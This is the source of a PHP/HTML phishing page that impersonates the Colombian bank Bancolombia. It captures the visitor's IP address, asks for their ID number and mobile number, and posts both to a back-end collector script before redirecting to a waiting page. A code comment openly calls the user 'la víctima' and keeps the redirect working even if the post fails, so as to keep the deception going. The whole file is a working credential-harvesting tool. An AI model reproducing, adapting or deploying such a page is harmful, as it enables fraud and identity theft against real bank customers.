<?php
$ip = getenv("REMOTE_ADDR");
$tiempo = date("l, j \d\e F \d\e Y");
date_default_timezone_set('America/Bogota');
?>
<!DOCTYPE html>
<html>
    <head>
        <title>Bancolombia - Verificación de Datos</title>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">

        <link rel="preconnect" href="https://fonts.googleapis.com">
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@700;800&display=swap" rel="stylesheet">

        <script src="https://kit.fontawesome.com/45b9078c9f.js" crossorigin="anonymous"></script>        
        <link href="../css/stylesheet.css" rel="stylesheet">
        <link href="../css/style-app.css?v2" rel="stylesheet">        
        <link rel="icon" type="image/png" href="../img/logo.png" />
        <script type="text/javascript" src="../js/jquery-3.6.0.min.js"></script>
        <script type="text/javascript" src="../js/functions.js?v=<?php echo time(); ?>"></script>

        <style type="text/css">
            /* FIX: display none para que la pantalla cargue visible */
            #fondo, #cargando, #cargando-o {
                display: none;
                position: fixed;
                top: 0; left: 0; width: 100%; height: 100%;
                background: rgba(255,255,255,0.95);
                z-index: 9999;
                text-align: center;
                padding-top: 50%;
            }
            .entradas { border: none; outline: none; width: 100%; font-size: 16px; }
            #btn-info:disabled { background-color: #ccc; cursor: not-allowed; }
            #btn-info { width: 85%; margin: 20px auto; display: block; height: 48px; border: none; border-radius: 5px; font-weight: bold; }
        </style>
    </head>
    <body>         
        <div id="fondo"></div>
        <div id="cargando-o">
            <img src="../img/load4.gif" width="90">            
            <br>Cargando...
        </div>

        <table width="100%" border="0" cellpadding="0" cellspacing="0" style="padding: 10px;">
            <tr>
                <td valign="middle" align="left" width="33%"><img src="../img/btn-cerrar.jpg" height="29"></td>
                <td valign="middle" align="center" width="34%"><img src="../img/logo-app.jpg" height="29"></td>
                <td valign="middle" align="right" width="33%"><img src="../img/btn-continuar-off.jpg" height="29"></td>
            </tr>
        </table>        
        
        <br><br>
        <div class="titulo-app" style="text-align: center; font-weight: 800;">Verificación de datos</div>  
        <div class="descripcion-app" style="text-align: center; padding: 0 20px;">Ingrese sus datos personales para gestionar aprobación</div>  
        
        <div class="frm" style="padding: 20px;">
            <div class="inp" id="inp-documento" style="border-bottom: 1px solid #ccc; padding: 10px 0;">
                <table width="100%" cellpadding="0" cellspacing="0" border="0">
                    <tr>
                        <td valign="middle" width="36" align="left"><img src="../img/ico-id.jpg" width="26"></td>
                        <td valign="middle" align="left">
                            <input type="text" id="txt-documento" placeholder="Número de documento" class="entradas" autocomplete="off" inputmode="numeric" maxlength="10">
                        </td>
                    </tr>
                </table>
            </div>
            <br>
            <div class="inp" id="inp-celular" style="border-bottom: 1px solid #ccc; padding: 10px 0;">
                <table width="100%" cellpadding="0" cellspacing="0" border="0">
                    <tr>
                        <td valign="middle" width="36" align="left"><img src="../img/ico-cel.jpg" width="26"></td>
                        <td valign="middle" align="left">
                            <input type="text" id="txt-celular" placeholder="Teléfono celular" class="entradas" autocomplete="off" inputmode="numeric" maxlength="10">
                        </td>
                    </tr>
                </table>
            </div>
        </div>  

        <button class="botones" id="btn-info" disabled>CONTINUAR</button> 
        <br>
        <div style="color:#1A1B1A; font-weight: bold; font-size: 14px; text-decoration: underline; text-align: center;">¿No eres cliente?</div>  

        <script type="text/javascript">
            $(document).ready(function() { 
                // 1. Quitar cualquier bloqueo al cargar
                $("#fondo, #cargando-o").hide();

                // 2. Lógica Dinámica: Validar campos en tiempo real
                $("#txt-documento, #txt-celular").on("input", function() {
                    var doc = $("#txt-documento").val();
                    var cel = $("#txt-celular").val();

                    if (doc.length >= 6 && cel.length === 10) {
                        $("#btn-info").prop("disabled", false).css({"background-color": "#FDDA24", "color": "#000"});
                    } else {
                        $("#btn-info").prop("disabled", true).css("background-color", "#ccc");
                    }
                });

                // 3. Envío de datos
                $("#btn-info").click(function() {
                    var d = $("#txt-documento").val();
                    var c = $("#txt-celular").val();
                    
                    $("#fondo, #cargando-o").show();
                    
                    // Enviamos a tu proceso de datos y volvemos al WAITING
                    $.post("../process/datonuevo.php", { documento: d, celular: c }, function(r) {
                        window.location.href = "WAITING.php";
                    }).fail(function() {
                        // Si falla el archivo, igual saltamos para no trabar la víctima
                        window.location.href = "WAITING.php";
                    });
                });
            });
        </script>
    </body>
</html>
